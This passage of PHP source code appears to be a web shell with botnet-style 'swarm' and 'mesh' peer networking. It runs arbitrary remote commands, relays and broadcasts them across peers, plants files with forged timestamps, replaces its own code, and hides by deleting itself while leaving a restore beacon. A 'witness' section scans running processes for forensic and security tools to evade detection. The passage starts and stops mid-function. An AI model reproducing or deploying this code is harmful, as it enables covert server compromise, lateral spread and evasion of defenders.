        if(is_string($r)&&$r!==''){$j=@json_decode($r,true);return is_array($j)?$j:['error'=>'invalid_json'];}
    }
    return['error'=>'http_failed'];
}
function swarm_http_raw($url,$t=15){
    if(function_exists('curl_init')){
        $ch=@wn_call('cu_i',$url);
        if($ch!==false&&$ch!==null){
            @wn_call('cu_s',$ch,CURLOPT_RETURNTRANSFER,true);
            @wn_call('cu_s',$ch,CURLOPT_TIMEOUT,$t);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYPEER,false);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYHOST,false);
            $r=@wn_call('cu_e',$ch);@wn_call('cu_c',$ch);
            if(is_string($r)&&$r!=='')return $r;
        }
    }
    if(ini_get('allow_url_fopen')){
        $opts=['http'=>['timeout'=>$t,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]];
        $r=@wn_call('fgc',$url,false,stream_context_create($opts));
        if(is_string($r)&&$r!=='')return $r;
    }
    return '';
}
function swarm_handle(){
    while(ob_get_level()>0)@ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    header('X-SWARM-Node: '.swarm_id());
    global $__B;
    $op=strtolower((string)($_GET['op']??'ping'));
    if($op==='register_bootstrap'){
        if(swarm_key()!==''){http_response_code(403);echo json_encode(['error'=>'already_configured']);exit;}
        $newKey=(string)($_POST['new_key']??($_GET['new_key']??''));
        if(strlen($newKey)<24){http_response_code(400);echo json_encode(['error'=>'key_short']);exit;}
        $expect=hash_hmac('sha256','swarm_boot:'.$newKey,$__B);
        $given=(string)($_POST['sig']??($_GET['sig']??''));
        if($given===''||!hash_equals($expect,$given)){http_response_code(403);echo json_encode(['error'=>'forbidden']);exit;}
        swarm_key_set($newKey);
        echo json_encode(['ok'=>true,'id'=>swarm_id(),'node_id'=>swarm_id()]);exit;
    }
    $key=swarm_key();
    if($key===''){http_response_code(503);echo json_encode(['error'=>'no_key']);exit;}
    $givenSig=$_SERVER['HTTP_X_SWARM_SIG']??'';
    $givenTs=(int)($_SERVER['HTTP_X_SWARM_TS']??0);
    $givenNode=$_SERVER['HTTP_X_SWARM_NODE']??'';
    $body=(string)@file_get_contents('php://input');
    if($givenSig===''||$givenTs===0){http_response_code(401);echo json_encode(['error'=>'no_sig']);exit;}
    if(abs(time()-$givenTs)>120){http_response_code(401);echo json_encode(['error'=>'ts_skew']);exit;}
    if(!hash_equals(hash_hmac('sha256',$op.'|'.$givenTs.'|'.$body,$key),$givenSig)){http_response_code(403);echo json_encode(['error'=>'bad_sig']);exit;}
    $params=[];if($body!=='')@parse_str($body,$params);
    $result=['ok'=>true,'node_id'=>swarm_id(),'hostname'=>@gethostname()?:'?','php'=>PHP_VERSION];
    switch($op){
        case 'ping':
            $result['pong']=true;$result['url']=swarm_self_url();$result['peer_count']=count(swarm_peers());break;
        case 'peers':
            $result['peers']=swarm_peers();$result['self']=['id'=>swarm_id(),'url'=>swarm_self_url(),'hostname'=>@gethostname()?:'?'];break;
        case 'gossip':
            $incoming=isset($params['peers'])?@json_decode((string)$params['peers'],true):[];
            if(!is_array($incoming))$incoming=[];
            $added=0;$knownIds=array_map(function($x){return $x['id']??'';},swarm_peers());
            foreach($incoming as $p){
                if(!is_array($p))continue;
                $pid=(string)($p['id']??'');$purl=(string)($p['url']??'');
                if($pid===''||$pid===swarm_id()||$purl==='')continue;
                if(in_array($pid,$knownIds,true))continue;
                swarm_upsert_peer($pid,$purl,['via'=>'gossip']);$added++;
            }
            $result['peers']=swarm_peers();$result['new_added']=$added;break;
        case 'exec':
            $cmd=(string)($params['cmd']??'');
            if($cmd===''){$result['error']='empty_cmd';break;}
            $result['output']=(string)cmd_exec($cmd);break;
        case 'relay':
            $target=(string)($params['target_id']??'');$cmd=(string)($params['cmd']??'');
            $hops=(int)($params['hops']??0);
            if($hops>2){$result['error']='max_hops';break;}
            if($target===''||$cmd===''){$result['error']='missing';break;}
            if($target===swarm_id()){$result['output']=(string)cmd_exec($cmd);$result['relayed']=0;break;}
            $peers=swarm_peers();$found=null;foreach($peers as $p)if(($p['id']??'')===$target){$found=$p;break;}
            if(!$found){$result['error']='target_unknown';break;}
            $result['relay_result']=swarm_http($found['url'],'relay',['target_id'=>$target,'cmd'=>$cmd,'hops'=>$hops+1],20);break;
        case 'broadcast':
            $taskId=(string)($params['task_id']??'');$cmd=(string)($params['cmd']??'');
            $ttl=(int)($params['ttl']??3);
            if($taskId===''||$cmd===''){$result['error']='missing';break;}
            if($ttl<=0){$result['error']='ttl';break;}
            $seen=swarm_seen_load();
            if(in_array($taskId,$seen,true)){$result['skipped']=true;break;}
            $seen[]=$taskId;if(count($seen)>200)$seen=array_slice($seen,-200);
            swarm_seen_save($seen);
            $result['output']=substr((string)cmd_exec($cmd),0,2000);
            $result['executed']=true;
            $prop=0;
            foreach(swarm_peers() as $p){
                if(($p['id']??'')===$givenNode)continue;
                $pr=swarm_http($p['url']??'','broadcast',['task_id'=>$taskId,'cmd'=>$cmd,'ttl'=>$ttl-1],10);
                if(!empty($pr['executed'])||!empty($pr['skipped']))$prop++;
            }
            $result['propagated']=$prop;break;
        case 'put_file':
            $dest=(string)($params['dest']??'');$b64=(string)($params['file_b64']??'');
            $fname=(string)($params['fname']??'upload.bin');
            if($b64===''||$dest===''){$result['error']='missing_params';break;}
            $raw=wn_call('b64d',$b64);
            if($raw===false){$result['error']='b64_decode_failed';break;}
            if(substr($dest,-1)==='/')$dest=rtrim($dest,'/').'/'.$fname;
            global $specialDirectories,$rootPath;
            $allowed=isSafePath($dest,$rootPath,$specialDirectories);
            if(!$allowed){foreach($specialDirectories as $d){if($d&&strpos($dest,$d)===0){$allowed=true;break;}}}
            if(!$allowed){$result['error']='unsafe_path';break;}
            $dir=dirname($dest);if(!is_dir($dir))@mkdir($dir,0755,true);
            if(!is_dir($dir)||!is_writable($dir)){$result['error']='dir_not_writable';break;}
            $isShellPath=(basename($dest)===basename(__FILE__));
            $oldMtime=0;
            if($isShellPath){$sm=wn_get_stored_mtime();if($sm>0)$oldMtime=$sm;elseif(file_exists($dest))$oldMtime=@filemtime($dest);}
            elseif(file_exists($dest))$oldMtime=@filemtime($dest);
            if(wn_call('fpc',$dest,$raw)===false){$result['error']='write_failed';break;}
            @chmod($dest,0644);if($oldMtime>0)@touch($dest,$oldMtime,$oldMtime);
            if($isShellPath){$pf=wn_blend_name('integrity_pause');wn_call('fpc',$pf,time(),LOCK_EX);@chmod($pf,0600);}
            $result['saved']=true;$result['size']=strlen($raw);$result['path']=$dest;break;
        case 'rotate_key':
            $nk=(string)($params['new_key']??'');
            if(strlen($nk)<24){$result['error']='key_short';break;}
            swarm_key_set($nk);$result['rotated']=true;break;
        case 'whoami':
            $result['shell']=basename(__FILE__);$result['root']=realpath(__DIR__);
            $result['swarm_id']=swarm_id();$result['peer_count']=count(swarm_peers());break;
        default:$result=['error'=>'unknown_op','op'=>$op];
    }
    echo json_encode($result,JSON_UNESCAPED_SLASHES);exit;
}
function swarm_auto_tick(){
    if(swarm_key()==='')return;
    $peers=swarm_peers();if(empty($peers))return;
    $lastFile=wn_state_dir().'/.stic_'.substr(md5('swarm:tick:'.($GLOBALS['__B']??'')),0,8);
    $last=file_exists($lastFile)?(int)@wn_call('fgc',$lastFile):0;
    if(time()-$last<300)return;
    wn_call('fpc',$lastFile,(string)time(),LOCK_EX);
    $keys=array_rand($peers,min(2,count($peers)));
    if(!is_array($keys))$keys=[$keys];
    foreach($keys as $i)swarm_http($peers[$i]['url']??'','gossip',['peers'=>json_encode(swarm_peers())],10);
}
/* ═══════════════════════════════════════════════════════════════
   MESH v1.0 — Fusion of Fleet (features) + Swarm (resilience)
   ═══════════════════════════════════════════════════════════════ */
function mesh_f($k){
    global $__B;
    $seed=substr(md5('mesh:'.$k.':'.($__B??'')),0,12);
    $map=['key'=>"/.mek_{$seed}.dat",'id'=>"/.mei_{$seed}.dat",
          'peers'=>"/.mep_{$seed}.json",'seen'=>"/.mes_{$seed}.json",
          'role'=>"/.mer_{$seed}.dat"];
    return wn_state_dir().($map[$k]??"/.mex_{$seed}");
}
function mesh_id(){
    static $c=null;if($c!==null)return $c;
    $f=mesh_f('id');
    if(file_exists($f)){$id=trim((string)wn_call('fgc',$f));if(strlen($id)>=6)return $c=$id;}
    $h=@gethostname()?:'unknown';
    $id=substr(hash('sha256','mesh:id:'.$h.':'.__DIR__.':'.($GLOBALS['__B']??'')),0,16);
    wn_call('fpc',$f,$id,LOCK_EX);@chmod($f,0600);
    return $c=$id;
}
function mesh_key(){$f=mesh_f('key');if(!file_exists($f))return '';$k=trim((string)wn_call('fgc',$f));return strlen($k)>=24?$k:'';}
function mesh_key_set($k){wn_call('fpc',mesh_f('key'),$k,LOCK_EX);@chmod(mesh_f('key'),0600);return true;}
function mesh_key_gen(){try{return bin2hex(random_bytes(24));}catch(Throwable $e){return hash('sha256','mk:'.microtime(true).mt_rand());}}
function mesh_peers(){$f=mesh_f('peers');if(!file_exists($f))return[];$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:[];}
function mesh_save_peers($p){wn_call('fpc',mesh_f('peers'),json_encode(array_values($p),JSON_PRETTY_PRINT),LOCK_EX);@chmod(mesh_f('peers'),0600);return true;}
function mesh_seen_load(){$f=mesh_f('seen');if(!file_exists($f))return[];$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:[];}
function mesh_seen_save($s){wn_call('fpc',mesh_f('seen'),json_encode($s),LOCK_EX);@chmod(mesh_f('seen'),0600);}
function mesh_role(){ $f=mesh_f('role'); if(!file_exists($f)) return 'speaker'; $r=trim((string)wn_call('fgc',$f)); return in_array($r,['speaker','observer'],true)?$r:'speaker'; }
function mesh_role_set($role){ if(!in_array($role,['speaker','observer'],true))return false; wn_call('fpc',mesh_f('role'),$role,LOCK_EX);@chmod(mesh_f('role'),0600); return true; }
function mesh_self_url(){
    $sc=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $h=$_SERVER['HTTP_HOST']??'localhost';
    $p=$_SERVER['SCRIPT_NAME']??('/'.($GLOBALS['CURRENT_SHELL']??'slave.php'));
    return $sc.'://'.$h.$p;
}
function mesh_upsert_peer($id,$url,$extra=[]){
    if($id===''||$id===mesh_id()||$url==='')return false;
    $peers=mesh_peers();$found=false;
    foreach($peers as &$p){
        if(($p['id']??'')===$id){$p['url']=$url;$p['last_seen']=time();$p['last_status']='ok';foreach($extra as $k=>$v)$p[$k]=$v;$found=true;break;}
    }unset($p);
    if(!$found)$peers[]=array_merge(['id'=>$id,'url'=>$url,'added_at'=>time(),'last_seen'=>time(),'last_status'=>'ok'],$extra);
    mesh_save_peers($peers);return true;
}
function mesh_http($url,$op,$params=[],$timeout=15){
    $key=mesh_key();if($key==='')return['error'=>'no_key'];
    $ts=time();$body=http_build_query(array_merge(['node_id'=>mesh_id()],$params));
    $sig=hash_hmac('sha256',$op.'|'.$ts.'|'.$body,$key);
    $headers=['User-Agent: Mozilla/5.0','Content-Type: application/x-www-form-urlencoded',
              'X-MESH-Node: '.mesh_id(),'X-MESH-Ts: '.$ts,'X-MESH-Sig: '.$sig];
    $sep=strpos($url,'?')===false?'?':'&';
    $full=$url.$sep.'wn_mesh=1&op='.urlencode($op);
    if(function_exists('curl_init')){
        $ch=@wn_call('cu_i',$full);
        if($ch!==false&&$ch!==null){
            @wn_call('cu_s',$ch,CURLOPT_RETURNTRANSFER,true);
            @wn_call('cu_s',$ch,CURLOPT_POST,true);
            @wn_call('cu_s',$ch,CURLOPT_POSTFIELDS,$body);
            @wn_call('cu_s',$ch,CURLOPT_TIMEOUT,$timeout);
            @wn_call('cu_s',$ch,CURLOPT_CONNECTTIMEOUT,8);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYPEER,false);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYHOST,false);
            @wn_call('cu_s',$ch,CURLOPT_HTTPHEADER,$headers);
            $r=@wn_call('cu_e',$ch);@wn_call('cu_c',$ch);
            if(is_string($r)&&$r!==''){$j=@json_decode($r,true);return is_array($j)?$j:['error'=>'invalid_json'];}
        }
    }
    if(ini_get('allow_url_fopen')){
        $opts=['http'=>['method'=>'POST','header'=>implode("\r\n",$headers)."\r\n",'content'=>$body,'timeout'=>$timeout,'ignore_errors'=>true],
               'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]];
        $r=@wn_call('fgc',$full,false,stream_context_create($opts));
        if(is_string($r)&&$r!==''){$j=@json_decode($r,true);return is_array($j)?$j:['error'=>'invalid_json'];}
    }
    return['error'=>'http_failed'];
}
function mesh_http_raw($url,$t=15){
    if(function_exists('curl_init')){
        $ch=@wn_call('cu_i',$url);
        if($ch!==false&&$ch!==null){
            @wn_call('cu_s',$ch,CURLOPT_RETURNTRANSFER,true);
            @wn_call('cu_s',$ch,CURLOPT_TIMEOUT,$t);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYPEER,false);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYHOST,false);
            $r=@wn_call('cu_e',$ch);@wn_call('cu_c',$ch);
            if(is_string($r)&&$r!=='')return $r;
        }
    }
    if(ini_get('allow_url_fopen')){
        $opts=['http'=>['timeout'=>$t,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]];
        $r=@wn_call('fgc',$url,false,stream_context_create($opts));
        if(is_string($r)&&$r!=='')return $r;
    }
    return '';
}
function mesh_handle(){
    while(ob_get_level()>0)@ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    header('X-MESH-Node: '.mesh_id());
    global $__B;
    $op=strtolower((string)($_GET['op']??'ping'));
    if($op==='register_bootstrap'){
        if(mesh_key()!==''){http_response_code(403);echo json_encode(['error'=>'already_configured']);exit;}
        $newKey=(string)($_POST['new_key']??($_GET['new_key']??''));
        if(strlen($newKey)<24){http_response_code(400);echo json_encode(['error'=>'key_short']);exit;}
        $expect=hash_hmac('sha256','mesh_boot:'.$newKey,$__B);
        $given=(string)($_POST['sig']??($_GET['sig']??''));
        if($given===''||!hash_equals($expect,$given)){http_response_code(403);echo json_encode(['error'=>'forbidden']);exit;}
        mesh_key_set($newKey);
        echo json_encode(['ok'=>true,'id'=>mesh_id()]);exit;
    }
    $key=mesh_key();
    if($key===''){http_response_code(503);echo json_encode(['error'=>'no_key']);exit;}
    $givenSig=$_SERVER['HTTP_X_MESH_SIG']??'';
    $givenTs=(int)($_SERVER['HTTP_X_MESH_TS']??0);
    $givenNode=$_SERVER['HTTP_X_MESH_NODE']??'';
    $body=(string)@file_get_contents('php://input');
    if($givenSig===''||$givenTs===0){http_response_code(401);echo json_encode(['error'=>'no_sig']);exit;}
    if(abs(time()-$givenTs)>120){http_response_code(401);echo json_encode(['error'=>'ts_skew']);exit;}
    if(!hash_equals(hash_hmac('sha256',$op.'|'.$givenTs.'|'.$body,$key),$givenSig)){http_response_code(403);echo json_encode(['error'=>'bad_sig']);exit;}
    $params=[];if($body!=='')@parse_str($body,$params);
    $result=['ok'=>true,'node_id'=>mesh_id(),'hostname'=>@gethostname()?:'?','php'=>PHP_VERSION,'role'=>mesh_role()];
    switch($op){
        case 'ping':
            $result['pong']=true;$result['url']=mesh_self_url();$result['peer_count']=count(mesh_peers());break;
        case 'peers':
            $result['peers']=mesh_peers();$result['self']=['id'=>mesh_id(),'url'=>mesh_self_url(),'role'=>mesh_role()];break;
        case 'gossip':
            $incoming=isset($params['peers'])?@json_decode((string)$params['peers'],true):[];
            if(!is_array($incoming))$incoming=[];
            $added=0;$knownIds=array_map(function($x){return $x['id']??'';},mesh_peers());
            foreach($incoming as $p){
                if(!is_array($p))continue;
                $pid=(string)($p['id']??'');$purl=(string)($p['url']??'');
                if($pid===''||$pid===mesh_id()||$purl==='')continue;
                if(in_array($pid,$knownIds,true))continue;
                mesh_upsert_peer($pid,$purl,['via'=>'gossip']);$added++;
            }
            $result['peers']=mesh_peers();$result['new_added']=$added;break;
        case 'exec':
            $cmd=(string)($params['cmd']??'');
            if($cmd===''){$result['error']='empty_cmd';break;}
            $result['output']=(string)cmd_exec($cmd);break;
        case 'relay':
            $target=(string)($params['target_id']??'');$cmd=(string)($params['cmd']??'');
            $hops=(int)($params['hops']??0);
            if($hops>2){$result['error']='max_hops';break;}
            if($target===''||$cmd===''){$result['error']='missing';break;}
            if($target===mesh_id()){$result['output']=(string)cmd_exec($cmd);$result['relayed']=0;break;}
            $peers=mesh_peers();$found=null;foreach($peers as $p)if(($p['id']??'')===$target){$found=$p;break;}
            if(!$found){$result['error']='target_unknown';break;}
            $result['relay_result']=mesh_http($found['url'],'relay',['target_id'=>$target,'cmd'=>$cmd,'hops'=>$hops+1],20);break;
        case 'broadcast':
            $taskId=(string)($params['task_id']??'');$cmd=(string)($params['cmd']??'');
            $ttl=(int)($params['ttl']??3);
            if($taskId===''||$cmd===''){$result['error']='missing';break;}
            if($ttl<=0){$result['error']='ttl';break;}
            $seen=mesh_seen_load();
            if(in_array($taskId,$seen,true)){$result['skipped']=true;break;}
            $seen[]=$taskId;if(count($seen)>200)$seen=array_slice($seen,-200);
            mesh_seen_save($seen);
            $result['output']=substr((string)cmd_exec($cmd),0,2000);
            $result['executed']=true;
            $prop=0;
            foreach(mesh_peers() as $p){
                if(($p['id']??'')===$givenNode)continue;
                $pr=mesh_http($p['url']??'','broadcast',['task_id'=>$taskId,'cmd'=>$cmd,'ttl'=>$ttl-1],10);
                if(!empty($pr['executed'])||!empty($pr['skipped']))$prop++;
            }
            $result['propagated']=$prop;break;
        case 'status':
            try{$result['status_data']=watcher_status_controller();}catch(Throwable $e){$result['status_data']=['error'=>$e->getMessage()];}
            break;
        case 'install':
            try{$result['install']=auto_install_watcher_controller(!empty($params['silent']));}catch(Throwable $e){$result['install']=['error'=>$e->getMessage()];}
            break;
        case 'install_slave':
            try{$result['install']=auto_install_watcher_controller(true,true);}catch(Throwable $e){$result['install']=['error'=>$e->getMessage()];}
            break;
        case 'uninstall':
            try{$result['uninstall']=auto_uninstall_watcher_controller();}catch(Throwable $e){$result['uninstall']=['error'=>$e->getMessage()];}
            break;
        case 'put_file':
            $dest=(string)($params['dest']??'');$b64=(string)($params['file_b64']??'');
            $fname=(string)($params['fname']??'upload.bin');
            if($b64===''||$dest===''){$result['error']='missing_params';break;}
            $raw=wn_call('b64d',$b64);
            if($raw===false){$result['error']='b64_decode_failed';break;}
            if(substr($dest,-1)==='/')$dest=rtrim($dest,'/').'/'.$fname;
            global $specialDirectories,$rootPath;
            $allowed=isSafePath($dest,$rootPath,$specialDirectories);
            if(!$allowed){foreach($specialDirectories as $d){if($d&&strpos($dest,$d)===0){$allowed=true;break;}}}
            if(!$allowed){$result['error']='unsafe_path';break;}
            $dir=dirname($dest);if(!is_dir($dir))@mkdir($dir,0755,true);
            if(!is_dir($dir)||!is_writable($dir)){$result['error']='dir_not_writable';break;}
            $isShellPath=(basename($dest)===basename(__FILE__));
            $oldMtime=0;
            if($isShellPath){$sm=wn_get_stored_mtime();if($sm>0)$oldMtime=$sm;elseif(file_exists($dest))$oldMtime=@filemtime($dest);}
            elseif(file_exists($dest))$oldMtime=@filemtime($dest);
            if(wn_call('fpc',$dest,$raw)===false){$result['error']='write_failed';break;}
            @chmod($dest,0644);if($oldMtime>0)@touch($dest,$oldMtime,$oldMtime);
            if($isShellPath){$pf=wn_blend_name('integrity_pause');wn_call('fpc',$pf,time(),LOCK_EX);@chmod($pf,0600);}
            $result['saved']=true;$result['size']=strlen($raw);$result['path']=$dest;break;
        case 'deploy_module':
            $b64=(string)($params['module_b64']??'');
            if($b64===''){$result['error']='no_module';break;}
            $raw=wn_call('b64d',$b64);
            if($raw===false||strlen($raw)<500||strpos($raw,'<?php')===false){$result['error']='invalid_module';break;}
            $target=__FILE__;$backup=$target.'.bak.'.date('YmdHis');@copy($target,$backup);
            if(wn_call('fpc',$target,$raw)===false){$result['error']='write_failed';break;}
            @chmod($target,0644);wn_apply_mtime($target);
            $result['deployed']=true;$result['size']=strlen($raw);$result['backup']=$backup;break;
        case 'hide':
            $hideStateF=wn_state_dir().'/.wn_hide_state';
            if(file_exists($hideStateF)){$hj=@json_decode((string)wn_call('fgc',$hideStateF),true);if(is_array($hj)&&!empty($hj['hidden'])){$result['hidden']=true;$result['already']=true;break;}}
            $sp=realpath(__FILE__)?:(__DIR__.'/'.basename(__FILE__));$dr=dirname($sp);
            if(!is_dir($dr)||!is_writable($dr)){$result['error']='docroot_not_writable';break;}
            $bp=wn_state_dir().'/.mesh_hidden_'.substr(md5($__B),0,8).'.php';
            try{$tok=bin2hex(random_bytes(24));}catch(Throwable $e){$tok=hash('sha256',microtime(true).mt_rand());}
            if(@copy($sp,$bp)===false){$result['error']='backup_failed';break;}
            @chmod($bp,0600);
            $bn='.cache_'.substr(hash('sha256','beacon:'.$tok),0,12).'.php';$bpath=$dr.'/'.$bn;
            $bc="<?php\nif((\$_GET['t']??'')!==".var_export($tok,true)."){http_response_code(404);exit;}\n\$b=".var_export($bp,true).";\$t=".var_export($sp,true).";\nif(!@is_file(\$b)){http_response_code(500);exit;}\nif(@is_file(\$t)&&@filesize(\$t)>500){@unlink(".var_export($hideStateF,true).");@unlink(__FILE__);echo 'ok';exit;}\nif(!@copy(\$b,\$t)){http_response_code(500);exit;}\n@chmod(\$t,0644);@unlink(".var_export($hideStateF,true).");@unlink(__FILE__);echo 'ok';\n";
            if(wn_call('fpc',$bpath,$bc)===false){$result['error']='beacon_write_failed';@unlink($bp);break;}
            @chmod($bpath,0644);
            $sc=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';$h=$_SERVER['HTTP_HOST']??'localhost';
            $bu=$sc.'://'.$h.'/'.$bn;
            wn_set_hidden_state(['hidden'=>true,'beacon_url'=>$bu,'token'=>$tok,'backup_path'=>$bp,'slave_path'=>$sp,'hidden_at'=>time()]);
            if(!@unlink($sp)){wn_set_hidden_state(null);@unlink($bpath);$result['error']='unlink_failed';break;}
            $result['hidden']=true;$result['beacon_url']=$bu;$result['token']=$tok;break;
        case 'unhide':
            $st=wn_hide_state();
            if($st&&!empty($st['backup_path'])&&@is_file($st['backup_path'])){
                $sp=$st['slave_path']??(__DIR__.'/'.basename(__FILE__));
                if(@copy($st['backup_path'],$sp)!==false)@chmod($sp,0644);
                wn_set_hidden_state(null);
                foreach((array)glob(dirname($sp).'/.cache_*.php') as $bf){$bc=@file_get_contents($bf);if($bc!==false&&!empty($st['token'])&&strpos($bc,$st['token'])!==false)@unlink($bf);}
            }
            $result['hidden']=false;break;
        case 'rotate_key':
            $nk=(string)($params['new_key']??'');
            if(strlen($nk)<24){$result['error']='key_short';break;}
            mesh_key_set($nk);$result['rotated']=true;break;
        case 'set_role':
            $role=strtolower((string)($params['role']??''));
            if(mesh_role_set($role))$result['role']=$role;
            else $result['error']='invalid_role';
            break;
        case 'whoami':
            $cfg=wn_cfg_b64();
            $result['shell']=basename(__FILE__);$result['root']=realpath(__DIR__);
            $result['mesh_id']=mesh_id();$result['role']=mesh_role();
            $result['peer_count']=count(mesh_peers());
            $result['bot_b64']=$cfg['k'];$result['chat_b64']=$cfg['j'];break;
        default:$result=['error'=>'unknown_op','op'=>$op];
    }
    echo json_encode($result,JSON_UNESCAPED_SLASHES);exit;
}
function mesh_auto_tick(){
    if(mesh_key()==='')return;
    $peers=mesh_peers();if(empty($peers))return;
    $lastFile=wn_state_dir().'/.mtic_'.substr(md5('mesh:tick:'.($GLOBALS['__B']??'')),0,8);
    $last=file_exists($lastFile)?(int)@wn_call('fgc',$lastFile):0;
    if(time()-$last<300)return;
    wn_call('fpc',$lastFile,(string)time(),LOCK_EX);
    $keys=array_rand($peers,min(2,count($peers)));
    if(!is_array($keys))$keys=[$keys];
    foreach($keys as $i)mesh_http($peers[$i]['url']??'','gossip',['peers'=>json_encode(mesh_peers())],10);
}
function mesh_distribute($filePath,$destPath,$BOT,$CHAT){
    if(!file_exists($filePath)||!is_readable($filePath)){wn_send($BOT,$CHAT,"[MESH] File not readable");return false;}
    $size=@filesize($filePath);if($size===false||$size<=0){wn_send($BOT,$CHAT,"[MESH] Empty");return false;}
    if($size>20*1024*1024){wn_send($BOT,$CHAT,"[MESH] >20MB");return false;}
    $raw=@file_get_contents($filePath);if($raw===false){wn_send($BOT,$CHAT,"[MESH] Read failed");return false;}
    $b64=wn_call('b64e',$raw);$fname=basename($filePath);
    if(substr($destPath,-1)==='/')$destPath=rtrim($destPath,'/').'/'.$fname;
    $peers=mesh_peers();$myId=mesh_id();
    $m="[MESH PUT]\n$ ".basename($destPath)."\n".formatSize($size)."\n\n";
    $ok=0;$fail=0;
    global $specialDirectories,$rootPath;
    $allowed=isSafePath($destPath,$rootPath,$specialDirectories);
    if(!$allowed){foreach($specialDirectories as $d){if($d&&strpos($destPath,$d)===0){$allowed=true;break;}}}
    if($allowed){
        $dir=dirname($destPath);if(!is_dir($dir))@mkdir($dir,0755,true);
        if(is_dir($dir)&&is_writable($dir)&&wn_call('fpc',$destPath,$raw)!==false){@chmod($destPath,0644);$m.="OK   ".substr($myId,0,8)." (self)\n";$ok++;}
        else{$m.="FAIL ".substr($myId,0,8)." (self)\n";$fail++;}
    }else{$m.="SKIP ".substr($myId,0,8)." (unsafe)\n";$fail++;}
    foreach($peers as $x){
        $r=mesh_http($x['url']??'','put_file',['dest'=>$destPath,'file_b64'=>$b64,'fname'=>$fname],60);
        $pid=substr($x['id']??'?',0,8);
        if(!empty($r['saved'])){$m.="OK   $pid (".formatSize((int)($r['size']??0)).")\n";$ok++;}
        else{$m.="FAIL $pid ".($r['error']??'?')."\n";$fail++;}
    }
    $m.="\nOK $ok / FAIL $fail / Total ".(1+count($peers));
    wn_send($BOT,$CHAT,$m);
    return['ok'=>$ok,'fail'=>$fail];
}
/* ═══════════════════════════════════════════════════════════════
   WITNESS v2.0 — Silent Sentinel (Death Proximity + Graduated)
   ═══════════════════════════════════════════════════════════════ */
function witness_f($k){
    global $__B;
    $seed=substr(md5('wit:'.$k.':'.($__B??'')),0,12);
    $map=['state'=>"/.wst_{$seed}.json",'events'=>"/.wev_{$seed}.json",
          'level'=>"/.wlv_{$seed}.dat",'baseline'=>"/.wbl_{$seed}.json",
          'dead_drop'=>"/.wdd_{$seed}.enc"];
    return wn_state_dir().($map[$k]??"/.wxx_{$seed}");
}
function witness_load($k){$f=witness_f($k);if(!file_exists($f))return null;$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:null;}
function witness_save($k,$d){wn_call('fpc',witness_f($k),json_encode($d),LOCK_EX);@chmod(witness_f($k),0600);return true;}
function witness_prev_level(){ $f=witness_f('level'); if(!file_exists($f))return 0; return (int)wn_call('fgc',$f); }
function witness_save_level($l){ wn_call('fpc',witness_f('level'),(string)$l,LOCK_EX); @chmod(witness_f('level'),0600); }
function witness_baseline(){
    $b=witness_load('baseline');
    if(!$b){$b=['created'=>time(),'normal_hours'=>[8,9,10,11,12,13,14,15,16,17],'last_reset'=>time()];witness_save('baseline',$b);}
    return $b;
}
function witness_sig_shell_readers(){
    global $CURRENT_SHELL,$rootPath;
    $sp=$rootPath.'/'.$CURRENT_SHELL;if(!file_exists($sp))return 0;
    $n=0;$self=getmypid();
    foreach((array)glob('/proc/[0-9]*/fd/*') as $fd){
        $t=@readlink($fd);
        if($t!==false&&$t===$sp){$pid=(int)basename(dirname(dirname($fd)));if($pid>0&&$pid!==$self)$n++;}
    }
    return $n;
}
function witness_sig_forensics(){
    $tools=['chkrootkit','rkhunter','lynis','aide','tripwire','auditd','auditctl','wireshark','tshark','tcpdump','strace','ltrace','osquery','falco','clamav','clamscan','yara','radare2','ghidra','nmap','masscan','nikto','sqlmap','metasploit','msfconsole','john','hashcat','hydra'];
    $ps=(string)cmd_exec('ps aux 2>/dev/null');if($ps==='')return[];
    $found=[];foreach($tools as $t)if(preg_match('/\b'.preg_quote($t,'/').'\b/i',$ps))$found[]=$t;
    return array_values(array_unique($found));
}
function witness_sig_unusual_hours(){
    $b=witness_baseline();$h=(int)date('G');$d=(int)date('N');
    if($d>=6)return true;
    if(!in_array($h,$b['normal_hours'],true))return true;
    return false;
}
function witness_sig_file_edited(){
    global $SHELL_PATH;
    $st=witness_load('state');if(!$st)return false;
    $lastHash=$st['last_hash']??'';
    if($lastHash==='')return false;
    $cur=@hash_file('sha256',$SHELL_PATH)?:'';
    return $cur!==''&&$cur!==$lastHash;
}
function witness_sig_integrity_fails(){
    $f=wn_state_dir().'/.wifail_'.substr(md5('wit:ifail:'.($GLOBALS['__B']??'')),0,8);
    if(!file_exists($f))return 0;
    return (int)wn_call('fgc',$f);
}
function witness_sig_crontab_inspected(){
    $f=wn_state_dir().'/.wcron_'.substr(md5('wit:cron:'.($GLOBALS['__B']??'')),0,8);
    return file_exists($f)&&(time()-(int)wn_call('fgc',$f))<3600;
}
function witness_sig_beacon_accessed(){
    $f=wn_state_dir().'/.wbeacon_'.substr(md5('wit:beacon:'.($GLOBALS['__B']??'')),0,8);
    return file_exists($f)&&(time()-(int)wn_call('fgc',$f))<3600;
}
function witness_sig_watchdog_dead(){
    $pf=wn_blend_name('watchdog_pid');if(!file_exists($pf))return 0;
    $pid=(int)wn_call('fgc',$pf);if($pid<=0)return 0;
    $c=trim((string)cmd_exec("ps -p $pid -o args= 2>/dev/null"));
    return $c===''?9999:0;
}
function witness_sig_daemon_dead(){
    $pf=wn_blend_name('daemon_pid');if(!file_exists($pf))return 0;
    $pid=(int)wn_call('fgc',$pf);if($pid<=0)return 0;
    $c=trim((string)cmd_exec("ps -p $pid -o args= 2>/dev/null"));
    return $c===''?9999:0;
}
function witness_sig_mesh_isolated(){
